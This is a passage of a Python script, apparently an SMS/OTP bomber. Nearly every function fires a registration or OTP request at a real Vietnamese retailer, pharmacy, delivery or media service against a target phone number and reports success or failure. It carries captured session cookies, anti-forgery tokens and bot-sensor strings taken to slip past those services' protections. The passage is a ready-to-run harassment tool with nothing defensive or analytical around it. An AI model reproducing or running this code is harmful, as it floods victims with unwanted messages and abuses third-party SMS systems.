        print("SFIN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SFIN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sapo(): #ap
    cookies = {
        '_ce.s': 'v~49080a70832696e187ca7fecd56e47732d086b79~lcw~1737281377270~vir~new~lva~1737281358226~vpv~0~v11.fhb~1737281358870~v11.lhb~1737281358870~v11.cs~200798~v11.s~7235a980-d64d-11ef-b9eb-6fd44cdb52b3~v11.sla~1737281377273~lcw~1737281377274',
        '_gcl_au': '1.1.469866645.1737281357.833280956.1737281366.1737281366',
        '_ga_8Z6MB85ZM2': 'GS1.1.1737281358.1.0.1737281362.56.0.0',
        '_ga_P9DPF3E00F': 'GS1.1.1737281357.1.0.1737281361.56.0.1419720187',
        '_fbp': 'fb.1.1737281358518.413443319714398426',
        '_ga': 'GA1.1.1455940863.1737281357',
        '_ga_HXMGB9WRVX': 'GS1.1.1737281359.1.0.1737281359.60.0.0',
        '_ce.clock_data': '78%2C171.224.177.243%2C2%2Ced14c804f644b5b0aaa13f3f8ddb4a1f%2CMobile%20Safari%2CVN',
        '_ga_EBZKH8C7MK': 'GS1.2.1737281358.1.0.1737281358.0.0.0',
        '_ga_Y9YZPDEGP0': 'GS1.1.1737281358.1.0.1737281358.60.0.0',
        '_ga_YNVPPJ8MZP': 'GS1.1.1737281357.1.0.1737281358.59.0.0',
        '_pk_id.564990941.8ae7': '0.1737281358.1.1737281358.1737281358.',
        '_pk_ses.564990941.8ae7': '*',
        'cebs': '1',
        'cebsp_': '1',
        '_ga_8956TVT2M3': 'GS1.1.1737281357.1.0.1737281357.60.0.0',
        '_ga_CDD1S5P7D4': 'GS1.1.1737281357.1.0.1737281357.60.0.0',
        '_ga_GECRBQV6JK': 'GS1.1.1737281357.1.0.1737281357.60.0.0',
        '_gat_UA-239546923-1': '1',
        '_gat_gtag_UA_66880228_1': '1',
        '_gid': 'GA1.2.2026095079.1737281357',
        'lang': 'vi',
    }

    headers = {
        'Host': 'accounts.sapo.vn',
        # 'Cookie': '_ce.s=v~49080a70832696e187ca7fecd56e47732d086b79~lcw~1737281377270~vir~new~lva~1737281358226~vpv~0~v11.fhb~1737281358870~v11.lhb~1737281358870~v11.cs~200798~v11.s~7235a980-d64d-11ef-b9eb-6fd44cdb52b3~v11.sla~1737281377273~lcw~1737281377274; _gcl_au=1.1.469866645.1737281357.833280956.1737281366.1737281366; _ga_8Z6MB85ZM2=GS1.1.1737281358.1.0.1737281362.56.0.0; _ga_P9DPF3E00F=GS1.1.1737281357.1.0.1737281361.56.0.1419720187; _fbp=fb.1.1737281358518.413443319714398426; _ga=GA1.1.1455940863.1737281357; _ga_HXMGB9WRVX=GS1.1.1737281359.1.0.1737281359.60.0.0; _ce.clock_data=78%2C171.224.177.243%2C2%2Ced14c804f644b5b0aaa13f3f8ddb4a1f%2CMobile%20Safari%2CVN; _ga_EBZKH8C7MK=GS1.2.1737281358.1.0.1737281358.0.0.0; _ga_Y9YZPDEGP0=GS1.1.1737281358.1.0.1737281358.60.0.0; _ga_YNVPPJ8MZP=GS1.1.1737281357.1.0.1737281358.59.0.0; _pk_id.564990941.8ae7=0.1737281358.1.1737281358.1737281358.; _pk_ses.564990941.8ae7=*; cebs=1; cebsp_=1; _ga_8956TVT2M3=GS1.1.1737281357.1.0.1737281357.60.0.0; _ga_CDD1S5P7D4=GS1.1.1737281357.1.0.1737281357.60.0.0; _ga_GECRBQV6JK=GS1.1.1737281357.1.0.1737281357.60.0.0; _gat_UA-239546923-1=1; _gat_gtag_UA_66880228_1=1; _gid=GA1.2.2026095079.1737281357; lang=vi',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'accept': '*/*',
        'sec-fetch-site': 'same-site',
        'accept-language': 'vi-VN,vi;q=0.9',
        'sec-fetch-mode': 'cors',
        'origin': 'https://app.sapo.vn',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/537.36',
        'referer': 'https://app.sapo.vn/',
        'sec-fetch-dest': 'empty',
    }

    data = {
        'CountryCode': '84',
        'InfoSource': '',
        'FullName': 'duy dub',
        'PhoneNumber': sdt,
        'StoreName': 'huy bb6',
        'PackageTitle': 'mobile_v3',
        'City': 'Hồ Chí Minh',
        'Preferred': '',
        'SaleName': '',
        'Reference': '',
        'Source': 'iphone',
        'Referral': '',
        'Campaign': '',
        'LandingPage': '',
        'StartTime': '',
        'EndTime': '',
        'PageView': '',
        'AffId': '',
        'AffTrackingId': '',
        'Partner': '',
        'Type': '1',
        'PreferredService': '',
        'SalesTeam': '',
        'SocialSource': '',
        'FacebookName': '',
        'FacebookAvatar': '',
        'FacebookId': '',
        'FacebookEmail': '',
        'GoogleId': '',
        'GoogleEmail': '',
        'GoogleName': '',
        'Country': '',
    }

    try:
        response = requests.post('https://accounts.sapo.vn/register', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()
        print("SAPO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SAPO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def truedoc(): #ap
    headers = {
        'Host': 'mapi.aihealth.vn',
        'accept': 'application/json',
        'content-type': 'application/json; charset=utf-8',
        'x-auth-id': '9B1B13952BD9FF446AB569BBB49B3',
        'authorization': 'Bearer ',
        'postman-token': 'f3dc96f9-6287-46cb-9b93-7d69dfeca783,298d8d62-ed78-4b27-b614-182d047e15fa',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'AI_HEALTH/14 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN',
    }

    params = {
        'Phone': sdt,
        'CountryCode': '84',
        'DeviceId': '5308E878-5785-4579-B17D-736E1E008E47',
        'UuidByKeychain': '5308E878-5785-4579-B17D-736E1E008E47',
        'GrantType': 'register_key',
    }

    try:
        response = requests.get('https://mapi.aihealth.vn/api/mobile/v1/sso/register/key', params=params, headers=headers)
        response.raise_for_status()
        print("TRUEDOC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TRUEDOC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def longchau1():

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'dnt': '1',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-channel': 'EStore',
    }

    json_data = {
        'phoneNumber': sdt,
        'otpType': 1,
        'fromSys': 'WEBKHLC',
    }
    try:
        response = requests.get(
        'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
        headers=headers,
        json=json_data,)
        response.raise_for_status()
        print("LONGCHAU1 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("LONGCHAU1 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
    
def longchau():


    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'dnt': '1',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-channel': 'EStore',
    }

    json_data = {
        'phoneNumber': sdt,
        'otpType': 0,
        'fromSys': 'WEBKHLC',
    }

    try:
        response = requests.post(
        'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
        headers=headers,
        json=json_data,
    )
        response.raise_for_status()
        print("LONGCHAU | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("LONGCHAU | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def bibabo():

    url = "https://one.bibabo.vn/api/v1/login/otp/createOtp"

    params = {
    'phone': sdt,
    'reCaptchaToken': "undefined",
    'appId': "7",
    'version': "2"
    }

    headers = {
    'User-Agent': "bibabo/522 CFNetwork/1474 Darwin/23.0.0",
    'Accept': "application/json, text/plain, */*",
    'accept-language': "vi-VN,vi;q=0.9"
    }
    try:
        response = requests.get(url, params=params, headers=headers)
        response.raise_for_status()
        print("BIBABO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BIBABO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
    
def pizza():
    cookies = {
        '_gcl_au': '1.1.612062991.1693832247',
        '_ga': 'GA1.2.2100968570.1693832247',
        '_gid': 'GA1.2.823438155.1693832247',
        '_tt_enable_cookie': '1',
        '_ttp': '8QojcD2E-4ZWQyk38eZM5QTGEw2',
        '.Nop.Antiforgery': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfv24E3RhNn0Gzh_ZfI8o8Wz_70E5dmeH7esZnGk3kfpDoYl0nqfmWCM_bYhqeky2NpCvnsTzzuXkhQkM4j09nkqPhBnh1uMPP21hU9AV3mD3T8lmMRWX12116_xJvTbus',
        '.Nop.Customer': 'ba54ce0a-13e1-453c-8363-88bf017b8dcf',
        '.Nop.TempData': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMc3b9L6dS2K_oLOoyagdN1aldzaP3FtbjTZaRpraxoLyzli6tkONSWN-v0l1iigLI3u1FBkohAWQUURHDTENd1iCBv_bPKzmveLCo6E85w0E0PwkXLwDRiNyXvpU2-ffdmp97k0oVyXxa9RccWGi_uxVLdRep6tdHrKuPdgP06w7g',
    }

    headers = {
        'authority': 'thepizzacompany.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': '_gcl_au=1.1.612062991.1693832247; _ga=GA1.2.2100968570.1693832247; _gid=GA1.2.823438155.1693832247; _tt_enable_cookie=1; _ttp=8QojcD2E-4ZWQyk38eZM5QTGEw2; .Nop.Antiforgery=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfv24E3RhNn0Gzh_ZfI8o8Wz_70E5dmeH7esZnGk3kfpDoYl0nqfmWCM_bYhqeky2NpCvnsTzzuXkhQkM4j09nkqPhBnh1uMPP21hU9AV3mD3T8lmMRWX12116_xJvTbus; .Nop.Customer=ba54ce0a-13e1-453c-8363-88bf017b8dcf; .Nop.TempData=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMc3b9L6dS2K_oLOoyagdN1aldzaP3FtbjTZaRpraxoLyzli6tkONSWN-v0l1iigLI3u1FBkohAWQUURHDTENd1iCBv_bPKzmveLCo6E85w0E0PwkXLwDRiNyXvpU2-ffdmp97k0oVyXxa9RccWGi_uxVLdRep6tdHrKuPdgP06w7g',
        'dnt': '1',
        'origin': 'https://thepizzacompany.vn',
        'referer': 'https://thepizzacompany.vn/Otp',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        '__RequestVerificationToken': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdA6eKbtod3RRZhW0oMAbjY51WN7NObT74BSrixWfCNutY-oIWf45xqyHeDAqa6uoqs1jgc1YTZb9K75G_VbjoHC5Tpa6zerOu5KrKhCjOuHPKVnuUfgka_VUVi1RwMXbg',
    }
    try:
        response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data)
        print("PIZZA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PIZZA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def wastons():

    url = "https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep"

    params = {
    'lang': "vi"
    }

    payload = json.dumps({
    "otpTokenRequest": {
        "action": "REGISTRATION",
        "type": "SMS",
        "countryCode": "84",
        "target": sdt
    },
    "defaultAddress": {
        "mobileNumberCountryCode": "84",
        "mobileNumber": sdt
    },
    "mobileNumber": sdt
    })

    headers = {
    'User-Agent': "WTCVN/24050.8.0 (iOS/17.0.2)",
    'Accept': "application/json, text/plain, */*",
    'Content-Type': "application/json",
    'x-session-token': "5b3f554c05258ea55ab506a1ffc7aa8d",
    'baggage': "sentry-environment=preprod,sentry-public_key=8d22ab30a0174b6489b1e647ff6a8a28,sentry-release=vn.com.watsons.app%4024050.8.0%2B202407111813,sentry-trace_id=57b207211ecb40ad880861651a5e1914",
    'waiting-room-access-token': "",
    'x-app-name': "Watsons%20VN",
    'x-acf-sensor-data': "4,i,QeSJMIt5h2iaPmIbvXvXq4tVimb8YYYoz9HVkaOkZ4+50dFkANwHVTHJruLOhscngAw9Ajbz0ri+8cJcbazXBtp8Zn1dVjoqDt2YHcMy/yzo2Wjm+Zbvhxlb9t428/+fUnEMAsO67eNo5E8d2NjKOEFsAS+/AhDaXP0+raig9UU=,nAPyAaP9OJeaQNum0Y6YD8WCUBTFQKSGe/JvZkOrtTuLVg4V6hbPeNgDHVgxQeTc1kD+f39Lpk9739rigwa9dWFav4AM7lc8JpVCNuDFC44k5/UQKyt8gAZz+9hkEk6wzYB7o2ezvooWZEXQTZumLksEu6Nf41juprM/tD3KBmI=$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$7,3,12$$",
    'accept-language': "vi",
    'queue-target': "null",
    'cache-control': "no-cache",
    'sentry-trace': "57b207211ecb40ad880861651a5e1914-4b3ff6172e084c9d-0",
    'x-app-version': "24050.8.0",
    'env': "prod",
    'Cookie': "ak_bmsc=4ACC8C3607E0E9232360FDA1E1854E4F~000000000000000000000000000000~YAAQ9VJNG979NwaRAQAA/r9eCBi3G4NOUhKyBSBzBjyDhSfmrUMlGbtziWkFwdlHDattQysx6ioqzAwBYysRMFRqwZNTLa5UIwKiMCqQK52EXJca1/mPkvDYKlUNY6jMqBp8gA0T/uUQNLb+ADwajazL1i/y/uerZjb1BWt4OlsKrjPijiMfqPIW3MhtNi0jydTzlN2GyA9+mOZ16Vbsvdlo4Y+wr1aQAz+eqVktxM+b61s5xpAUDRo5bItDmWb2AjIJyyFU6QmLtiO+z/fwZvUUinqpOZpqrPboLMWwk8M2Jw6KKE/FIloJcpNvF+MUcPxGpI2YlEYshvYxxxYBH+Vn9mdRSYayp6sadTKWrMhVgaObxee0B9CzbCgiY+yxTlapAx7YiqgX4Q==; dtCookie=v_4_srv_36_sn_3F2A2BE1202593EA006C41DC139C0176_perc_100000_ol_0_mul_1_app-3Aa156527b274862dd_0; ROUTE=.accstorefront-78c88c89d7-lvpvg; authorization=pUbs8G_8XY2Hx9NiB8aJ3NCtnxk; token_type=guest"
    }
    try:
        response = requests.post(url, params=params, data=payload, headers=headers)
        response.raise_for_status()
        print("WASTONS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("WASTONS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def best():
    headers = {
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        'DNT': '1',
        'Origin': 'https://best-inc.vn',
        'Referer': 'https://best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }

    json_data = {
        'phoneNumber': sdt,
        'verificationCodeType': 1,
    }
    try:
        response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
        response.raise_for_status()
        print("BEST | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BEST | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mocha1():
    headers = {
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Origin': 'https://www.best-inc.vn',
    'Referer': 'https://www.best-inc.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'accept': 'application/json',
    'authorization': 'null',
    'content-type': 'application/json',
    'lang-type': 'vi-VN',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'x-auth-type': 'WEB',
    'x-lan': 'VI',
    'x-nat': 'vi-VN',
    'x-timezone-offset': '7',
}

    json_data = {
    'phoneNumber': sdt,
    'verificationCodeType': 1,
}
    try:
        response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
        response.raise_for_status()
        print("MOCHA1 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MOCHA1 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
    
def one():
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    # 'Content-Length': '0',
    'Origin': 'https://video.mocha.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://video.mocha.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    params = {
    'msisdn': sdt,
    'languageCode': 'vi',
}
    try:
        response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
        response.raise_for_status()
        print("ONE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ONE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def PNJ1():


    cookies = {
        'CDPI_VISITOR_ID': '78166678-ea1e-47ae-9e12-145c5a5fafc4',
        'CDPI_RETURN': 'New',
        'CDPI_SESSION_ID': 'f3a5c6c7-2ef6-4d19-a792-5e3c0410677f',
        'XSRF-TOKEN': 'eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D',
        'mypnj_session': 'eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
